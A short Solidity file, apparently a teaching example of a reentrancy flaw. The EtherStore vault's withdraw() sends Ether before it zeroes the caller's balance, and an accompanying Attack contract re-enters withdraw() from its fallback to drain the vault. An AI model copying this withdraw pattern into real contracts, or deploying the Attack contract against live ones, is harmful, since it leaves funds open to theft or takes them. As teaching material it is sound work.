// SPDX-License-Identifier: MIT OR Apache-2.0
pragma solidity ^0.8.0;

contract EtherStore {
    mapping(address => uint256) public balances;

    // Send Ether to contract
    function deposit() public payable {
        balances[msg.sender] += msg.value;
    }

    // withdraw by user
    function withdraw() public {
        uint256 bal = balances[msg.sender];
        require(bal > 0, "You don't have balance");
        // Send Ether to sender
        (bool sent, ) = msg.sender.call{value: bal}("");
        require(sent, "Send Ether fail");

        balances[msg.sender] = 0;
    }

    // get balance of contract
    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }
}

contract Attack {
    EtherStore public etherStore;

    constructor(address _etherStoreAddress) {
        etherStore = EtherStore(_etherStoreAddress);
    }

    fallback() external payable {
        if (address(etherStore).balance >= 1 ether) {
            etherStore.withdraw();
        }
    }

    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }

    function attack() external payable {
        require(msg.value >= 1 ether);
        etherStore.deposit{value: 1 ether}();
        etherStore.withdraw();
    }
}
